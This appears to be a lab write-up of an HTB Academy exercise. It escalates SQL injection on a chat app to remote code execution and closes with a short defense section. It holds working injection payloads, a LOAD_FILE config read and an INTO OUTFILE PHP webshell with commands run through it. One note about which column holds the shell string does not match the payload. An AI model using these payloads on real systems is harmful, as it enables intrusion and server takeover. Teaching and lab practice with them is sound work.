# HTB SQL Injection Fundamentals: From a Registration Bypass to Full RCE

**Target:** chattr.htb (HTB Academy — CWES Module 8)
**Tools:** Nmap, ffuf, Burp Suite

## 1. Recon

I started with a quick Nmap scan on the target IP. Port 80 was open, running Nginx. A quick ffuf directory scan using raft-medium-directories.txt revealed standard PHP endpoints: /login.php, /register.php, and /index.php. The tech stack was clearly PHP and MySQL based on the cookies (PHPSESSID) and server headers.

I spent 10 minutes manually trying basic SQLi payloads on the login form—no luck. It was solid. So, I moved to the registration page.

## 2. Finding the Injection Point

The registration form asked for a username, password, and an Invitation Code. I fired up Burp Suite, turned on Intercept, and submitted a dummy code.

The request looked like this:

```http
POST /register.php HTTP/1.1
Host: chattr.htb
Content-Type: application/x-www-form-urlencoded

username=testuser&password=Password123&invitationCode=test-code
```

I sent the request to Burp Repeater and changed the invitationCode parameter to:

```
invitationCode=abcd' OR '1'='1
```

The server responded with a 302 Found redirecting to the dashboard. The account was created. The original query was likely `SELECT * FROM codes WHERE code = 'abcd' OR '1'='1'`, which evaluates to True.

## 3. The Search Bar (The Real Target)

Once logged in, I had access to a chat interface. There was a search bar that took a `?q=` parameter. I wanted to test for UNION-based SQLi here.

I sent a single quote (') in the search. I got a 500 Internal Server Error with a visible SQL syntax error. This confirmed it was injectable.

The error indicated a trailing parenthesis. But because the query likely used wildcards (`LIKE '%$q%'`), a standard `')` payload wouldn't balance the string properly. I had to account for the trailing `%`. My working breakout payload was:

```
%')
```

This balances the wildcard (%), closes the string ('), and closes the parenthesis ()).

## 4. Escalation: SQLi → RCE

### Step 1: Finding Columns

I used ORDER BY to find the column count:

```sql
%') ORDER BY 4-- -
```

It returned a normal page. ORDER BY 5 threw the 500 error again. So, there were 4 columns.

### Step 2: Finding the Sink

I injected a UNION query to see which columns reflected on the page:

```sql
%') UNION SELECT 1,2,3,4-- -
```

The page rendered the number 3 where the message content usually appears. Column 3 was my visible sink.

### Step 3: Enumeration

I dumped the DB name and tables:

```sql
%') UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

I found the Users table. When I dumped it, I got argon2i password hashes. Cracking them was going to take too long, so I pivoted to file access.

### Step 4: File Read and Write

I checked my DB privileges:

```sql
%') UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
```

I had the FILE privilege. Before writing a shell, I needed the web root. I read the Nginx config:

```sql
%') UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4-- -
```

The config showed `root /var/www/chattr-prod;`.

I then used INTO OUTFILE to drop a PHP shell. Here is the exact payload:

```sql
%') UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
```

Note on the syntax: I used empty double quotes ("") for columns 1 and 4 to satisfy the query structure, and a single-quoted string for column 3. Mismatched quotes here would throw a syntax error.

### Step 5: Execution

Before jumping to the flag, I verified the RCE with the id command:

```
http://chattr.htb/shell.php?0=id
```

The server returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

Once RCE was confirmed, I grabbed the flag:

```
http://chattr.htb/shell.php?0=cat /flag.txt
```

## 5. Defense

The initial entry point was a lack of parameterized queries. The SQLi in the search bar and the registration form could have been entirely prevented by using Prepared Statements.

The critical escalation, however, was caused by over-privileged database configuration. The database user had the FILE privilege, which allowed reading Nginx configs and writing a webshell directly to the web root. A least-privilege database user (only SELECT, INSERT, UPDATE) would have stopped the attack at the password hashes.

## Conclusion

This lab was a great reminder that SQL injection is rarely just about dumping tables. When the database runs with excessive privileges, a simple UNION SELECT can quickly escalate to reading server configuration files and writing a functional webshell to the web root.
